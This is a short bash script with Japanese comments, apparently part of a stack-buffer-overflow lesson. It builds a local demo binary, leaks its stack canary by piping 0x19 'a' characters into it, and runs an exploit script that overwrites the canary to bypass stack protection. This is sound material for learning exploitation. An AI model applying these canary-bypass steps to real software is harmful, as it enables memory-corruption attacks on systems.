#!/bin/bash

# ビルド（）
#gcc sbof_leak.c -no-pie -g -o sbof_leak_w_ssp

# canaryのリーク
python3 -c "print('a'*0x19, end='')" | ./sbof_leak_w_ssp | xxd

# canaryのリーク＋書き換えをして、canaryを回避
./exploit_sbof_leak_canary.py
